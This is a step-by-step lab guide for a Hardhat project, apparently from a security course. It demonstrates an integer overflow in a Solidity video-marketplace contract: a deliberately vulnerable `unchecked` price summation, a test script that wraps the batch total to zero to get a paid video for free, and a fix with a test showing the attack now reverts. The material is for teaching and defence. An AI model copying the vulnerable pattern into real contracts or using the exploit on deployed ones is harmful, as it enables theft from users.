# Scenario 4 - Integer overflow in batch `purchaseVideos()`

> Execution guide. Follow the steps top to bottom. All paths are relative to
> `P2P App/contract/`. Commands are copy-paste ready.

This scenario adds a batch-purchase function, `purchaseVideos()`, that sums the
prices of several videos inside an `unchecked` block. Solidity 0.8+ reverts on
arithmetic overflow **by default**, but `unchecked` disables that protection. An
attacker uploads a video with a price crafted so that the batch total **wraps around
to zero**, making `require(msg.value >= totalPrice)` pass while paying (almost)
nothing - and thereby gaining access to other users' videos for free.

## Prerequisites (once)

```bash
cd "P2P App/contract"
npm install
npx hardhat compile
```

Runs under `npx hardhat test` (in-process EVM). No local node required.

---

## 1. Concepts

- **Fixed-width integers** - `uint256` holds values from `0` to `2^256 - 1`. Adding
  past the maximum **wraps around** (modulo `2^256`), e.g. `MAX + 1 == 0`.
- **Checked vs `unchecked` arithmetic** - since Solidity 0.8.0 arithmetic reverts on
  overflow/underflow automatically. An `unchecked { ... }` block turns that off (used
  for gas savings) - and re-introduces the classic overflow bug.
- **The exploit idea** - if a running total is computed `unchecked`, an attacker who
  controls one of the summed values can pick it so the total overflows to a small
  number, defeating a later `require(msg.value >= total)` check.
- **Attacker-controlled price** - `uploadVideo()` lets the caller set any `_price`,
  including values near `2^256`. That is the attacker's lever.

---

## 2. Vulnerable code

Create **`contracts/VideoStreamingOverflowVuln.sol`**. Note the `unchecked` block
around the price accumulation:

```solidity
function purchaseVideos(string[] memory _ipfsHashes) public payable {
    uint256 totalPrice = 0;
    unchecked {
        for (uint256 i = 0; i < _ipfsHashes.length; i++) {
            Video storage video = videos[_ipfsHashes[i]];
            require(video.isAvailable, "Video is not available");
            totalPrice += video.price;
        }
    }

    require(msg.value >= totalPrice, "Insufficient payment");

    for (uint256 i = 0; i < _ipfsHashes.length; ) {
        videoPurchasers[_ipfsHashes[i]][msg.sender] = true;
        emit VideoPurchased(_ipfsHashes[i], msg.sender);
        unchecked {
            i++;
        }
    }
}
```

**Why it's exploitable:** the attacker uploads a video whose price equals
`2^256 - victimPrice`. When the batch sums `victimPrice + (2^256 - victimPrice)`, the
`unchecked` result is `2^256 ≡ 0`. `require(msg.value >= 0)` then passes with
`msg.value == 0`, and the attacker is recorded as a purchaser of every video in the
batch - including the victim's - for free.

---

## 3. Attack

No attacker contract is needed. Create **`test/overflow.attack.test.js`**:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Scenario 4 - Integer overflow (attack on vulnerable contract)", function () {
  it("wraps the batch total to zero and buys videos for free", async function () {
    const [deployer, victim, attacker] = await ethers.getSigners();

    const VS = await ethers.getContractFactory("VideoStreamingOverflowVuln");
    const vs = await VS.deploy();
    await vs.waitForDeployment();

    // Victim uploads a real, priced video.
    const victimPrice = ethers.parseEther("0.1");
    await vs.connect(victim).uploadVideo("QmVictimVideo", victimPrice);

    // Attacker uploads a video priced so that victimPrice + evilPrice == 2^256 (== 0).
    const TWO_256 = 2n ** 256n;
    const evilPrice = TWO_256 - victimPrice;
    await vs.connect(attacker).uploadVideo("QmEvilVideo", evilPrice);

    console.log("Victim price:", ethers.formatEther(victimPrice), "ETH");
    console.log("Evil price  : 2^256 - victimPrice  (chosen so the sum overflows to 0)");
    console.log("Attacker pays: 0 ETH");

    // Batch-buy BOTH videos while sending 0 ETH.
    await vs.connect(attacker).purchaseVideos(["QmVictimVideo", "QmEvilVideo"], { value: 0 });

    const stoleVictim = await vs.videoPurchasers("QmVictimVideo", attacker.address);
    console.log("Attacker now owns access to victim's video:", stoleVictim, " <-- stolen for free");

    expect(stoleVictim).to.equal(true);
  });
});
```

### Run it

```bash
npx hardhat test test/overflow.attack.test.js
```

**Expected output (successful attack):**

```
  Scenario 4 - Integer overflow (attack on vulnerable contract)
Victim price: 0.1 ETH
Evil price  : 2^256 - victimPrice  (chosen so the sum overflows to 0)
Attacker pays: 0 ETH
Attacker now owns access to victim's video: true  <-- stolen for free
    ✔ wraps the batch total to zero and buys videos for free
```

The batch total overflowed to `0`, the payment check passed with `0` ETH, and the
attacker gained access to the victim's paid video for nothing.

> 📸 **Screenshot here (successful attack):** capture the terminal showing
> "Attacker pays: 0 ETH" and "...access to victim's video: true <-- stolen for free".
> `![successful attack](../screenshots/4-overflow-attack.png)`

---

## 4. Mitigation

Remove the `unchecked` block so Solidity's built-in overflow check applies. If the
total overflows, the transaction reverts automatically (panic code `0x11`,
"arithmetic overflow"). Optionally, also reject absurd prices at upload time.

Create **`contracts/VideoStreamingOverflowFixed.sol`**:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract VideoStreamingOverflowFixed {
    struct Video { string ipfsHash; address owner; uint256 price; bool isAvailable; }

    mapping(string => Video) public videos;
    mapping(address => uint256) public balances;
    mapping(string => mapping(address => bool)) public videoPurchasers;

    event VideoUploaded(string ipfsHash, address owner, uint256 price);
    event VideoPurchased(string ipfsHash, address buyer);

    function uploadVideo(string memory _ipfsHash, uint256 _price) public {
        require(videos[_ipfsHash].owner == address(0), "Video already exists");
        videos[_ipfsHash] = Video(_ipfsHash, msg.sender, _price, true);
        emit VideoUploaded(_ipfsHash, msg.sender, _price);
    }

    // FIXED: no `unchecked` -> overflow reverts automatically (Solidity 0.8+).
    function purchaseVideos(string[] memory _ipfsHashes) public payable {
        uint256 totalPrice = 0;
        for (uint256 i = 0; i < _ipfsHashes.length; i++) {
            Video storage video = videos[_ipfsHashes[i]];
            require(video.isAvailable, "Video is not available");
            totalPrice += video.price; // checked arithmetic: reverts on overflow
        }

        require(msg.value >= totalPrice, "Insufficient payment");

        for (uint256 i = 0; i < _ipfsHashes.length; i++) {
            videoPurchasers[_ipfsHashes[i]][msg.sender] = true;
            emit VideoPurchased(_ipfsHashes[i], msg.sender);
        }
    }
}
```

**What changed and why it works:**
- The `unchecked { totalPrice += video.price; }` became a plain `totalPrice +=
  video.price;`. With checked arithmetic, summing `victimPrice + (2^256 -
  victimPrice)` overflows `uint256` and the EVM reverts with panic `0x11` **before**
  the payment check is ever reached.
- The attacker can no longer force the total to wrap, so `require(msg.value >=
  totalPrice)` reflects the real total and a 0-ETH purchase is rejected.

---

## 5. Failed attack on the fixed code

Create **`test/overflow.mitigation.test.js`** - the identical attack now reverts.

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Scenario 4 - Integer overflow (blocked by checked arithmetic)", function () {
  it("the batch total overflow reverts instead of wrapping to zero", async function () {
    const [deployer, victim, attacker] = await ethers.getSigners();

    const VS = await ethers.getContractFactory("VideoStreamingOverflowFixed");
    const vs = await VS.deploy();
    await vs.waitForDeployment();

    const victimPrice = ethers.parseEther("0.1");
    await vs.connect(victim).uploadVideo("QmVictimVideo", victimPrice);

    const TWO_256 = 2n ** 256n;
    const evilPrice = TWO_256 - victimPrice;
    await vs.connect(attacker).uploadVideo("QmEvilVideo", evilPrice);

    // Same attack, but checked arithmetic makes the sum overflow -> revert (panic 0x11).
    await expect(
      vs.connect(attacker).purchaseVideos(["QmVictimVideo", "QmEvilVideo"], { value: 0 })
    ).to.be.revertedWithPanic(0x11); // arithmetic overflow

    const stoleVictim = await vs.videoPurchasers("QmVictimVideo", attacker.address);
    console.log("Attacker gained access to victim's video:", stoleVictim, " <-- blocked");

    expect(stoleVictim).to.equal(false); // attack blocked
  });
});
```

### Run it

```bash
npx hardhat test test/overflow.mitigation.test.js
```

**Expected output (attack fails):**

```
  Scenario 4 - Integer overflow (blocked by checked arithmetic)
Attacker gained access to victim's video: false  <-- blocked
    ✔ the batch total overflow reverts instead of wrapping to zero
```

The overflow now reverts the whole transaction, so the attacker gains nothing.

> 📸 **Screenshot here (failed attack):** capture the terminal showing the test
> passing with "Attacker gained access to victim's video: false <-- blocked".
> `![failed attack](../screenshots/4-overflow-mitigated.png)`
